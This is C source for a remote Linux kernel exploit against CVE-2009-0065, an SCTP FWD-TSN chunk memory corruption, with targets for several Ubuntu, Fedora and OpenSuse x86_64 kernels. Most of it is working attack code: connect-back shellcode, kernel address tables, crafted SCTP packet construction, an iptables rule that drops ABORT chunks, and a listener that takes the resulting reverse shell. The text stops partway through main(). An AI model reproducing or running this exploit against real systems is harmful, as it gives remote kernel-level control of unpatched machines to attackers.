/* CVE-2009-0065 SCTP FWD Chunk Memory Corruption 
 * Linux Kernel 2.6.x SCTP FWD Memory COrruption Remote Exploit 
 *
 * coded by: sgrakkyu <at> antifork.org
 * http://kernelbof.blogspot.com
 *
 *
 * NOTE: you need at least one sctp application bound on the target box 
 *
 * Supported target:
 * Ubuntu 7.04 x86_64 (2.6.20_15-17-generic / 2.6.20_17-server)
 * Ubuntu 8.04 x86_64 (2.6.24_16-23 generic/server)
 * Ubuntu 8.10 x86_64 (2.6.27_7-10 geenric/server)
 * Fedora Core 10 x86_64 (default installed kernel)
 * OpenSuse 11.1 x86_64  (default installed kernel) 
 */




#define _GNU_SOURCE

#include <signal.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/sctp.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/select.h>
#include <stdint.h>

#define __OFFSET_PORT_64 62 // 92
#define __OFFSET_HOST_64 64 // 94

//#define __TARGET_SPORT 20000


#ifndef __u8
#define __u8 uint8_t
#endif

#ifndef __u16
#define __u16 uint16_t
#endif

#ifndef __u32
#define __u32 uint32_t
#endif



/* start crc routines: ripped from wireshark sources */
#define SP_LEN 2
#define DP_LEN 2
#define VTAG_LEN 4
#define CHK_LEN 4
#define HEADER_LEN    (SP_LEN + DP_LEN + VTAG_LEN + CHK_LEN) 


#define CRC32C(c,d) (c=(c>>8)^crc_c[(c^(d))&0xFF])
static int32_t crc_c[256] =
{
0x00000000L, 0xF26B8303L, 0xE13B70F7L, 0x1350F3F4L,
0xC79A971FL, 0x35F1141CL, 0x26A1E7E8L, 0xD4CA64EBL,
0x8AD958CFL, 0x78B2DBCCL, 0x6BE22838L, 0x9989AB3BL,
0x4D43CFD0L, 0xBF284CD3L, 0xAC78BF27L, 0x5E133C24L,
0x105EC76FL, 0xE235446CL, 0xF165B798L, 0x030E349BL,
0xD7C45070L, 0x25AFD373L, 0x36FF2087L, 0xC494A384L,
0x9A879FA0L, 0x68EC1CA3L, 0x7BBCEF57L, 0x89D76C54L,
0x5D1D08BFL, 0xAF768BBCL, 0xBC267848L, 0x4E4DFB4BL,
0x20BD8EDEL, 0xD2D60DDDL, 0xC186FE29L, 0x33ED7D2AL,
0xE72719C1L, 0x154C9AC2L, 0x061C6936L, 0xF477EA35L,
0xAA64D611L, 0x580F5512L, 0x4B5FA6E6L, 0xB93425E5L,
0x6DFE410EL, 0x9F95C20DL, 0x8CC531F9L, 0x7EAEB2FAL,
0x30E349B1L, 0xC288CAB2L, 0xD1D83946L, 0x23B3BA45L,
0xF779DEAEL, 0x05125DADL, 0x1642AE59L, 0xE4292D5AL,
0xBA3A117EL, 0x4851927DL, 0x5B016189L, 0xA96AE28AL,
0x7DA08661L, 0x8FCB0562L, 0x9C9BF696L, 0x6EF07595L,
0x417B1DBCL, 0xB3109EBFL, 0xA0406D4BL, 0x522BEE48L,
0x86E18AA3L, 0x748A09A0L, 0x67DAFA54L, 0x95B17957L,
0xCBA24573L, 0x39C9C670L, 0x2A993584L, 0xD8F2B687L,
0x0C38D26CL, 0xFE53516FL, 0xED03A29BL, 0x1F682198L,
0x5125DAD3L, 0xA34E59D0L, 0xB01EAA24L, 0x42752927L,
0x96BF4DCCL, 0x64D4CECFL, 0x77843D3BL, 0x85EFBE38L,
0xDBFC821CL, 0x2997011FL, 0x3AC7F2EBL, 0xC8AC71E8L,
0x1C661503L, 0xEE0D9600L, 0xFD5D65F4L, 0x0F36E6F7L,
0x61C69362L, 0x93AD1061L, 0x80FDE395L, 0x72966096L,
0xA65C047DL, 0x5437877EL, 0x4767748AL, 0xB50CF789L,
0xEB1FCBADL, 0x197448AEL, 0x0A24BB5AL, 0xF84F3859L,
0x2C855CB2L, 0xDEEEDFB1L, 0xCDBE2C45L, 0x3FD5AF46L,
0x7198540DL, 0x83F3D70EL, 0x90A324FAL, 0x62C8A7F9L,
0xB602C312L, 0x44694011L, 0x5739B3E5L, 0xA55230E6L,
0xFB410CC2L, 0x092A8FC1L, 0x1A7A7C35L, 0xE811FF36L,
0x3CDB9BDDL, 0xCEB018DEL, 0xDDE0EB2AL, 0x2F8B6829L,
0x82F63B78L, 0x709DB87BL, 0x63CD4B8FL, 0x91A6C88CL,
0x456CAC67L, 0xB7072F64L, 0xA457DC90L, 0x563C5F93L,
0x082F63B7L, 0xFA44E0B4L, 0xE9141340L, 0x1B7F9043L,
0xCFB5F4A8L, 0x3DDE77ABL, 0x2E8E845FL, 0xDCE5075CL,
0x92A8FC17L, 0x60C37F14L, 0x73938CE0L, 0x81F80FE3L,
0x55326B08L, 0xA759E80BL, 0xB4091BFFL, 0x466298FCL,
0x1871A4D8L, 0xEA1A27DBL, 0xF94AD42FL, 0x0B21572CL,
0xDFEB33C7L, 0x2D80B0C4L, 0x3ED04330L, 0xCCBBC033L,
0xA24BB5A6L, 0x502036A5L, 0x4370C551L, 0xB11B4652L,
0x65D122B9L, 0x97BAA1BAL, 0x84EA524EL, 0x7681D14DL,
0x2892ED69L, 0xDAF96E6AL, 0xC9A99D9EL, 0x3BC21E9DL,
0xEF087A76L, 0x1D63F975L, 0x0E330A81L, 0xFC588982L,
0xB21572C9L, 0x407EF1CAL, 0x532E023EL, 0xA145813DL,
0x758FE5D6L, 0x87E466D5L, 0x94B49521L, 0x66DF1622L,
0x38CC2A06L, 0xCAA7A905L, 0xD9F75AF1L, 0x2B9CD9F2L,
0xFF56BD19L, 0x0D3D3E1AL, 0x1E6DCDEEL, 0xEC064EEDL,
0xC38D26C4L, 0x31E6A5C7L, 0x22B65633L, 0xD0DDD530L,
0x0417B1DBL, 0xF67C32D8L, 0xE52CC12CL, 0x1747422FL,
0x49547E0BL, 0xBB3FFD08L, 0xA86F0EFCL, 0x5A048DFFL,
0x8ECEE914L, 0x7CA56A17L, 0x6FF599E3L, 0x9D9E1AE0L,
0xD3D3E1ABL, 0x21B862A8L, 0x32E8915CL, 0xC083125FL,
0x144976B4L, 0xE622F5B7L, 0xF5720643L, 0x07198540L,
0x590AB964L, 0xAB613A67L, 0xB831C993L, 0x4A5A4A90L,
0x9E902E7BL, 0x6CFBAD78L, 0x7FAB5E8CL, 0x8DC0DD8FL,
0xE330A81AL, 0x115B2B19L, 0x020BD8EDL, 0xF0605BEEL,
0x24AA3F05L, 0xD6C1BC06L, 0xC5914FF2L, 0x37FACCF1L,
0x69E9F0D5L, 0x9B8273D6L, 0x88D28022L, 0x7AB90321L,
0xAE7367CAL, 0x5C18E4C9L, 0x4F48173DL, 0xBD23943EL,
0xF36E6F75L, 0x0105EC76L, 0x12551F82L, 0xE03E9C81L,
0x34F4F86AL, 0xC69F7B69L, 0xD5CF889DL, 0x27A40B9EL,
0x79B737BAL, 0x8BDCB4B9L, 0x988C474DL, 0x6AE7C44EL,
0xBE2DA0A5L, 0x4C4623A6L, 0x5F16D052L, 0xAD7D5351L,
};

static __u32 sctp_crc32c(const unsigned char* buf, __u32 len)
{
  __u32 i;
  __u32 crc32 = ~0U;
  __u32 r;
  unsigned char b0,b1,b2,b3;

  for (i = 0; i < SP_LEN + DP_LEN + VTAG_LEN; i++)
  {
    CRC32C(crc32, buf[i]);
  }
  CRC32C(crc32, 0);
  CRC32C(crc32, 0);
  CRC32C(crc32, 0);
  CRC32C(crc32, 0);
  for (i = HEADER_LEN; i < len; i++)
  {
    CRC32C(crc32, buf[i]);
  }
  r = ~crc32;

  b0 = r & 0xff;
  b1 = (r>>8) & 0xff;
  b2 = (r>>16) & 0xff;
  b3 = (r>>24) & 0xff;
  crc32 = ((b0 << 24) | (b1 << 16) | (b2 << 8) | b3);
  return ( crc32 );
}
/* end crc routines */

static char generic_x86_64_shellcode[] = 
// prolog 
"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb"
"\x48\x39\xd8\x75\x0f\x48\x31\xc0\xb0\x02\xcd\x80"
"\x48\x31\xdb\x48\x39\xc3\x74\x09\x5b\x48\x31\xc0"
"\xb0\x60\x0f\x05\xc3"          
// connect back 
"\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58"                           
"\x0f\x05\x48\x97\x50\x48\xb9\x02\x00\x0d\x05\x7f"
"\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"                 
"\x58\x0f\x05\x48\x31\xdb\x48\x39\xc3\x74\x07\x48"
"\x31\xc0\xb0\xe7\x0f\x05\x90"          
"\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75"
"\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48"
"\xf7\xd3\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48"
"\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0"
"\xb0\xe7\x0f\x05"
;

static const char __zero[4] = {0x00, 0x00, 0x00, 0x00};
//static char __force_crash[] = "\x41\x41\x41\x41\x41\x41\x41\x41";

static char generic_x86_64_patchjump[] = "\x48\x31\xc0\xb0\x60\x0f\x05\xc3";
static char generic_x86_64_jump[] = "\xe9\x2b\x09\x00\x00\x90";

/* ubuntu 7.04 */
static char ubuntu64_2_6_20_15to17_generic_x86_64_vsys_shadow[] = "\x00\x40\x56\x80\xFF\xFF\xFF\xFF";
static char ubuntu64_2_6_20_17_server_x86_64_vsys_shadow[] = "\x00\x90\x5B\x80\xFF\xFF\xFF\xFF";

/* ubuntu 8.04 */
static char ubuntu64_2_6_24_23_last_server_x86_64_vsys_shadow[] =    "\x00\x50\x62\x80\xFF\xFF\xFF\xFF";  
static char ubuntu64_2_6_24_19to22_server_x86_64_vsys_shadow[] =   "\x00\x40\x62\x80\xFF\xFF\xFF\xFF";  
static char ubuntu64_2_6_24_16to18_server_x86_64_vsys_shadow[] =   "\x00\x30\x62\x80\xFF\xFF\xFF\xFF";

static char ubuntu64_2_6_24_18to21_generic_x86_64_vsys_shadow[] =  "\x00\x40\x5d\x80\xFF\xFF\xFF\xFF"; 

/* ubuntu 8.10  */
static char ubuntu64_2_6_27_7_server_x86_64_vsys_shadow[] =  "\x00\x30\x6f\x80\xFF\xFF\xFF\xFF";  
static char ubuntu64_2_6_27_9tolast_server_x86_64_vsys_shadow[] =  "\x00\x40\x6f\x80\xFF\xFF\xFF\xFF";   

static char ubuntu64_2_6_27_7tolast_generic_x86_64_vsys_shadow[] =  "\x00\x40\x6f\x80\xFF\xFF\xFF\xFF";   

/* fedora code 10  */
static char fedora64_10_default_kernel_x86_64_vsys_shadow[] = "\x00\x10\x57\x81\xFF\xFF\xFF\xFF";
static char fedora64_10_default_kernel_x86_64_selinux[]     = "\x84\xE6\x7C\x81\xFF\xFF\xFF\xFF";

/* opensuse 11.1 */
static char opensuse64_11_1_default_kernel_x86_64_vsys_shadow[]="\x00\x10\x8E\x80\xFF\xFF\xFF\xFF";


#define __msg_f(format, args...) \
  do { fprintf(stdout, format, ## args); } while(0)

#define __msg(msg) \
  do { fprintf(stdout, "%s", msg); } while(0)

#define __fatal(msg) \
  do {fprintf(stderr, "%s", msg); exit(1);} while (0)

#define __fatal_perror(msg) \
  do { perror(msg); exit(1); } while (0)

enum {
  SLAB_ALLOCATOR=0,
  SLUB_ALLOCATOR=1
};

typedef struct 
{
  const char *name;
  const char *info;
  char *scode;
  __u32 scodesize;
  __u32 portoff;
  __u32 hostoff;  
  const char *vsysaddr;
  const char *vsysjump;
  __u32 vsysjumpsize;

  const char *vsyspatchjump;
  __u32 vsyspatchjumpsize;
 
  __u32 chunksize;
  __u32 slubsize; 
  __u32 ptrsize;

  const char *selinux;

  int allocator_type;

} kinfo;

static kinfo *k;

typedef struct 
{
  const char* target;
  const char* rhost;
  const char* lhost;
  __u16 rport;
  __u16 lport;
  
  __u16 sport; // defines associations
  __u16 nconn;
  
} hinfo;

static hinfo h = { NULL, NULL, NULL, 0, 0, 0, 600 };

static kinfo kernels[] = { 
    { 
      "ubuntu64_faisty-2.6.20-[15-17]-generic", 
      "(faisty: generic kernel)", 
      generic_x86_64_shellcode, 
      sizeof(generic_x86_64_shellcode) -1, 
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_20_15to17_generic_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      256,
      8,
      NULL,
      SLAB_ALLOCATOR
    },
    { 
      "ubuntu64_faisty-2.6.20-17-server", 
      "(faisty: server kernel - last 2.6.20-17 build)", 
      generic_x86_64_shellcode, 
      sizeof(generic_x86_64_shellcode) -1, 
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_20_17_server_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      256,
      8,
      NULL,
      SLAB_ALLOCATOR
    },
    {
      "ubuntu64_hardy-2.6.24-[18-21]-generic",
      "(kernel from 2.6.24-18 to kernel 2.6.24-21 -- generic)",
      generic_x86_64_shellcode,
      sizeof(generic_x86_64_shellcode) -1,
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_24_18to21_generic_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      NULL,
      SLUB_ALLOCATOR
    },
    {
      "ubuntu64_hardy_2.6.24-[16-18]-server",
      "(kernel from 2.6.24-16 to 2.6.24-18 -- server)", 
      generic_x86_64_shellcode,
      sizeof(generic_x86_64_shellcode) -1,
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_24_16to18_server_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      NULL,
      SLUB_ALLOCATOR
    },
    {
      "ubuntu64_hardy-2.6.24-[19-22]-server",
      "(kernel from 2.6.24-19 to 2.6.24-22 -- server)", 
      generic_x86_64_shellcode,
      sizeof(generic_x86_64_shellcode) -1,
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_24_19to22_server_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      NULL,
      SLUB_ALLOCATOR
    },
    {
      "ubuntu64_hardy-2.6.24-23-last-server",
      "(last 2.6.24-23 kernel before patch -- server)", 
      generic_x86_64_shellcode,
      sizeof(generic_x86_64_shellcode) -1,
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_24_23_last_server_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      NULL,
      SLUB_ALLOCATOR
    },
    { 
      "ubuntu64_intrepid-2.6.27-7-server", 
      "(kernel 2.6.27-7 -- server)",
      generic_x86_64_shellcode, 
      sizeof(generic_x86_64_shellcode) -1, 
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_27_7_server_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      NULL,
      SLUB_ALLOCATOR
    },
    { 
      "ubuntu64_intrepid-2.6.27-[9-last]-server", 
      "(kernel 2.6.27-9 to the last unpatched kernel -- server)",
      generic_x86_64_shellcode, 
      sizeof(generic_x86_64_shellcode) -1, 
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_27_9tolast_server_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      NULL,
      SLUB_ALLOCATOR
    },
    { 
      "ubuntu64_intrepid-2.6.27-[7-last]-generic", 
      "(kernel 2.6.27-9 to the last unpatched kernel -- server)",
      generic_x86_64_shellcode, 
      sizeof(generic_x86_64_shellcode) -1, 
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      ubuntu64_2_6_27_7tolast_generic_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      NULL,
      SLUB_ALLOCATOR
    },
    {
      "fedora64_10-2.6.25-117",
      "(fedora core 10 default installed kernel)",
      generic_x86_64_shellcode,
      sizeof(generic_x86_64_shellcode) -1,
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      fedora64_10_default_kernel_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      96,
      8,
      fedora64_10_default_kernel_x86_64_selinux,
      SLUB_ALLOCATOR
    },
    {
      "opensuse64_11.1-2.6.27.7-9-default",
      "(opensuse 11.1 default installed kernel)",
      generic_x86_64_shellcode,
      sizeof(generic_x86_64_shellcode) -1,
      __OFFSET_PORT_64,
      __OFFSET_HOST_64,
      opensuse64_11_1_default_kernel_x86_64_vsys_shadow,
      generic_x86_64_jump,
      6,
      generic_x86_64_patchjump,
      8,
      40,
      256, 
      8,
      NULL,
      SLAB_ALLOCATOR
    }
};



/* modular arithmetic shift */
#define __SHIFT_CHECK 0x7FFF
static __u16 shift_0_to_7fff[3] = { 0x7FFF, 0xFFFE, 0x0000 };
static __u16 shift_8000_to_ffff[3] = { 0xFFFF, 0x7FFE, 0x8000 };

/* global streams obj */
static __u16 streams[1000][2];

/* get stream flow */
static int build_stream(const void *data, __u32 size, __u16 fc)
{
  int chunk_num,i,j,stnum=0;
  __u16 *p;
  __u16 *shift;
  if(size % 2)
    __fatal("[!!!] build_stream: data unaligned");

  memset(streams, 0x00, sizeof(streams));

  chunk_num = size / 2;
  p = (__u16*)data;
  for(i=0; i<chunk_num; i++, p++, fc++)
  {
    __u16 val  = *p - 1; 
    if(val <= __SHIFT_CHECK)
      shift = shift_0_to_7fff;
    else
      shift = shift_8000_to_ffff; 

    for(j=0; j<3; j++)
    {
      streams[stnum][0] = fc;
      streams[stnum++][1] = shift[j];
    }

    streams[stnum][0] = fc;
    streams[stnum++][1] = val;
  }

  return stnum ? stnum : 0; 
}


/* some sctp packet header structs */
struct sctp_hdr
{
  __u16 sport;
  __u16 dport;
  __u32 vtag;
  __u32 checksum; 
  char chunks[0];
}__attribute__((packed));

struct sctp_chk
{
  __u8 type;
  __u8 flags;
  __u16 len;
  char data[0];
}__attribute((packed));

struct sctp_chunk_fwd
{
  __u8 type;
  __u8 flags;
  __u16 len;
  __u32 new_tsn;
}__attribute__((packed));



enum 
{
  SCTP_INIT_ACK = 2,
  SCTP_SACK = 3,
  SCTP_FWD = 192
};


void disable_abort()
{
  /* lame trick to block  ABORT chunks from reaching the target!
   * ABORT messages are generated because we receive a SACK with an out-of-bound TSN 
   * in reply to all fake FWD sent
   * (when this happens local kernel kills the connection)
   */

  system("iptables -t filter -A OUTPUT -p sctp --chunk-types any ABORT -j DROP");
}

#define FWD_MAX_SIZE 0x1000
void *make_fwd_packet(__u16 sp, __u16 dp, __u32 vtag, __u32 tsn, 
                      __u16 streams[][2], int streamlen, int *p_len)
{
  int i;  
  __u16 *pstream;
  struct sctp_hdr *hdr;
  struct sctp_chunk_fwd *fwd;
  __u8 *__buff = malloc(FWD_MAX_SIZE);
  memset(__buff, 0, FWD_MAX_SIZE);

  hdr = (struct sctp_hdr *)__buff;

  hdr->sport = htons(sp);
  hdr->dport = htons(dp);
  hdr->vtag = htonl(vtag);
  hdr->checksum = 0;
  fwd = (struct sctp_chunk_fwd *)(hdr->chunks);
  fwd->type = SCTP_FWD;
  fwd->flags = 0;
  fwd->len = htons(4 + 4 + (streamlen * 4)); // chunk + ctsn + streams
  fwd->new_tsn = htonl(tsn+1);

  /* build stream */
  pstream = (__u16 *)((&(fwd->new_tsn)) + 1);
  for(i=0; i<streamlen; i++)
  {
    *pstream++ = streams[i][0];
    *pstream++ = streams[i][1];
  }

  *p_len = ntohs(fwd->len) + sizeof(*hdr);
  hdr->checksum = htonl(sctp_crc32c(__buff, (__u32)(*p_len)));
  return hdr; 
}



/* this function gets VTAG/TSN bound with this socket pair */
int raw_socket_engine(__u16 sp, __u16 sp2, __u16 dp, 
                      __u32 *tsn, __u32 *vtag, __u32 *tsn2, __u32 *vtag2)
{
  char packet[1500];
  int p_len;
  void *end;
  struct sctp_hdr *hdr;
  struct sctp_chk *chk;
  __u32 tmp; 
  __u16 psp,pdp;
  fd_set r;
  struct timeval tv;

  int raw_fd = socket(PF_INET, SOCK_RAW, IPPROTO_SCTP);
  if(raw_fd < 0)
    __fatal_perror("socket: RAW/SCTP");


  FD_ZERO(&r);
  FD_SET(raw_fd, &r);
  tv.tv_usec=0;
  tv.tv_sec=10;

  while(select(raw_fd + 1, &r, NULL,NULL,&tv) > 0)
  {
    p_len = read(raw_fd, packet, sizeof(packet));
    end = packet + p_len;
    hdr = (struct sctp_hdr *)(packet + sizeof(struct iphdr));
    if((void*)(((char *)hdr)+4)  >= end) 
      continue;

    /* check for chunk */
    chk = (struct sctp_chk *)(hdr->chunks); 
    tmp  =  ntohl(*((__u32*)(chk->data)));
    psp = ntohs(hdr->sport);
    pdp = ntohs(hdr->dport);
    
    if(chk->type == SCTP_SACK)
    { 
      if(psp == dp && pdp == sp)
        *tsn  =  tmp;

      if(psp == dp && pdp == sp2)
        *tsn2  =  tmp;
    }
    
    if(chk->type == SCTP_INIT_ACK) 
    {
      if(psp == dp && pdp == sp)
        *vtag =  tmp;
    
      if(psp == dp && pdp == sp2)
        *vtag2 =  tmp;
    }

    if(*vtag && *tsn && *vtag2 && *tsn2)
      break;

    FD_ZERO(&r);
    FD_SET(raw_fd, &r);
    tv.tv_usec=0;
    tv.tv_sec=10;
  } 

  return 0;
}

/* global vars */
static __u16 sport=0;
static __u16 sport2=0;
static __u32 vtag=0, vtag2=0;
static __u32 tsn=0, tsn2=0;

static struct sockaddr_in server_sctp;
int raw_sctp=-1;

#define STACK_SIZE 0x1000
char clone_stack[STACK_SIZE*2];


static void send_fwd_chunk(__u16 sp, __u16 dp, __u16 streams[][2], 
                    int streamlen, __u32 vtag, __u32 tsn)
{
  int p_len=0, ret;
  void *packet = make_fwd_packet(sp, dp, vtag, tsn, streams, streamlen, &p_len);
  ret = sendto(raw_sctp, packet, p_len, 0, (struct sockaddr *)&server_sctp, sizeof(struct sockaddr_in)); 
  if(ret < 0)
    __fatal_perror("sendto: sending FWD chunk");

  free(packet);
}



static int clone_thread(void *p)
{
  raw_socket_engine(sport, sport2, h.rport, &tsn, &vtag, &tsn2, &vtag2);
  return 0;
}


static int make_sctp_connection(__u16 sp, __u16 dp, int data)
{
  struct sctp_initmsg msg;
  int ret,o=1,fd;
  socklen_t len_sctp=sizeof(struct sctp_initmsg);
  struct sockaddr_in s,c;

  fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
  if(fd < 0)
    __fatal_perror("socket: sctp SOCK_STREAM");

  ret = setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (char *)&o, sizeof(o));
  if (ret < 0) 
   __fatal_perror("setsockopt: SO_REUSEADDR");


  /* NOTE: here we assume server peer allocates  10 output streams (as default)
   * if the applciation behaves differently you must probe and change channels size
   * to get the correct slab  */

  if(k->allocator_type == SLAB_ALLOCATOR) // if SLAB change channel size 
  {
    getsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, &len_sctp);
    msg.sinit_num_ostreams=50; // force 256 slab allocation
    msg.sinit_max_instreams=10;
    setsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, len_sctp);
  }
  else
  {
    getsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, &len_sctp);
    msg.sinit_num_ostreams=10; // force 96 slab allocation
    msg.sinit_max_instreams=10;
    setsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, len_sctp);
  }


  if(sp)
  {
    c.sin_family = PF_INET;
    c.sin_port = htons(sp);
    c.sin_addr.s_addr = INADDR_ANY;
    ret = bind(fd, (struct sockaddr *)&c, sizeof(c));
    if(ret < 0)
      __fatal_perror("bind: sctp socket");
  }

  s.sin_family = PF_INET;
  s.sin_port   = htons(dp); 
  s.sin_addr.s_addr = inet_addr(h.rhost);

  ret = connect(fd, (struct sockaddr *)&s, sizeof(s));
  if(ret < 0)
    __fatal_perror("connect: sctp socket");

  
  /* send one byte of data to get correctly 
   * TSN from raw socket (from SACK replies) 
   */
  if(data)
  {
    ret = send(fd, "", 1, 0);
    if(ret < 0)
      __fatal_perror("send: sctp socket data");
  }
  return fd;
}


static void htons_streams(__u16 s[][2], int len)
{
  int i;
  for(i=0; i<len; i++)
  {
    s[i][0] = htons(s[i][0]);
    s[i][1] = htons(s[i][1]);
  }
}


static void usage()
{
  fprintf(stderr, "./sctp_houdini \n\t"
                  "-H lhost   (local host address for connect back shel)\n\t"
                  "-P lport   (local port address for connect back shell)\n\t"
                  "-h rhost   (remote target host)\n\t"
                  "-p rport   (remote target port)\n\t"
                  "-t kernel  (target kernel)\n\t"
                  "-s sport   (source port defining sctp association where corruption occurs)\n\t"
                  "           (always use higher port if you run the exploit multiple times eg. 20000, 21000, etc..)\n\t"
                  "           (NEVER reuse the same or next port or vsys will be trashed and init will die soon...)\n\t"
                  "-c conn    (number of connectionis before corruption - default 600)\n"
                  );
}

static void sctp_getopt(int argc, char *argv[])
{
  int ret,i;

  while((ret = getopt(argc, argv, "H:P:p:h:t:c:s:")) != -1)
  {
    switch(ret)
    {
      case 'P':
        h.lport = atoi(optarg); 
        break;

      case 'p':
        h.rport = atoi(optarg);
        break;

      case 't':
        h.target = optarg;
        break;

      case 'h':
        h.rhost = optarg;
        break;
    
      case 'H':
        h.lhost = optarg;
    
      case 'c':
        h.nconn = atoi(optarg);
        break;

      case 's':
        h.sport = atoi(optarg);
        break;
    }
  }


  if(!h.lport || !h.rport || !h.rhost || !h.target || !h.lhost || !h.sport)
  {
    usage();
    exit(1);
  }

  if(h.sport < h.nconn+1)
  {
    fprintf(stderr, "Source Association Port is too low: %d\n", h.sport);
    usage(); 
    exit(1);
  }

  sport=h.sport;
  sport2=h.sport + 1;

  for(i=0; i < sizeof(kernels)/sizeof(kinfo); i++)
  {
    if(!strcmp(h.target, kernels[i].name))
    {
      k = &kernels[i];
      break;
    }
  }  

  if(k==NULL)
  {
    fprintf(stderr, "Unable to find target: %s\nAvailable targets are:\n", h.target);
    for(i=0; i < sizeof(kernels)/sizeof(kinfo); i++)
    {
      fprintf(stderr, "- %s  %s\n", kernels[i].name, kernels[i].info);
    }
    exit(1);
  }
}

void patchjump()
{
  int ret;

  __msg("[**] Restoring vsys: Emulate gettimeofday()... \n");
  ret = build_stream(k->vsyspatchjump, k->vsyspatchjumpsize, 0); 
  if(ret < 0)
    __fatal("Error Building Streams...");

  htons_streams(streams, ret);
  send_fwd_chunk(sport2, h.rport, streams, ret, vtag2, tsn2); 

}


static void multiplex(int listenfd)
{
  int ret,new_fd;
  fd_set r;
  struct timeval t;
  char buffer[1500];


  FD_ZERO(&r);
  FD_SET(listenfd, &r);
  t.tv_sec = 3;
  t.tv_usec = 0;
  __msg("[**] Waiting daemons executing gettimeofday().. this can take up to one minute...\n");
  __msg("[**] ..");
  fflush(stdout);

  while(select(listenfd+1, &r, NULL, NULL, &t) == 0)
  {
    printf("..");
    fflush(stdout);
    t.tv_sec = 3;
    t.tv_usec = 0;
    FD_ZERO(&r);
    FD_SET(listenfd, &r);
  }
  __msg("..\n");

  new_fd = accept(listenfd, NULL, 0);
  if(new_fd < 0)
    __fatal_perror("accept: listen fd");
 

  __msg("[**] Connected!\n"); 
  patchjump(); 

  close(listenfd);
  
  write(new_fd, "id\n", 3);

  FD_ZERO(&r);
  FD_SET(new_fd, &r);
  FD_SET(0, &r);
  while(select(new_fd+1, &r, NULL, NULL, NULL) > 0)
  {
    if(FD_ISSET(0, &r)) // read from stdin
    {
      ret = read(0, buffer, sizeof(buffer)); 
      if(ret < 0)
        __fatal_perror("read: from stdin");
      else 
        ret = write(new_fd, buffer, ret);
    }

    if(FD_ISSET(new_fd, &r))
    {
      ret = read(new_fd, buffer, sizeof(buffer));
      if(!ret) {
        __msg("Endopoint closed the connection\n");
        break;
      }
      else if(ret > 0)
      {
        write(1, buffer, ret); 
      }
      else 
        __fatal_perror("read: from net");
    }

    FD_ZERO(&r);
    FD_SET(new_fd, &r);
    FD_SET(0, &r);
  }
  
}


/* needed when exploiting old SLAB */
void swap_to_SLAB_chunk()
{
  __u32 tmp;  
  __u16 tmp16;

  tmp =  tsn;
  tsn = tsn2;
  tsn2 = tmp;

  tmp = vtag;
  vtag = vtag2;
  vtag2 = tmp;

  tmp16 = sport;
  sport = sport2;
  sport2 = tmp16;
}



int main(int argc, char **argv)
{

  int ret, fd, i, listenfd,o=1;
  struct sockaddr_in l;
  __u32 lh;
  __u16 lp;

  sctp_getopt(argc, argv);

  listenfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (char *)&o, sizeof(o)) < 0)
   __fatal_perror("setsockopt: SO_REUSEADDR");
  
  l.sin_family = PF_INET;
  l.sin_port = htons(h.lport); 
  l.sin_addr.s_addr = inet_addr(h.lhost);
  if(bind(listenfd, (struct sockaddr *)&l, sizeof(l)) < 0)
    __fatal_perror("bind: sock");
  
  if(listen(listenfd, 4) < 0)
    __fatal_perror("listen: sock");
  

  /* set connect back params */
  lh = inet_addr(h.lhost);
  lp = htons(h.lport);
  memcpy(k->scode + k->portoff, &lp, 2);
  memcpy(k->scode + k->hostoff, &lh, 4);

  raw_sctp = socket(PF_INET, SOCK_RAW, IPPROTO_SCTP);
  if(raw_sctp < 0)
    __fatal_perror("socket: RAW/SCTP montitor socket");
  
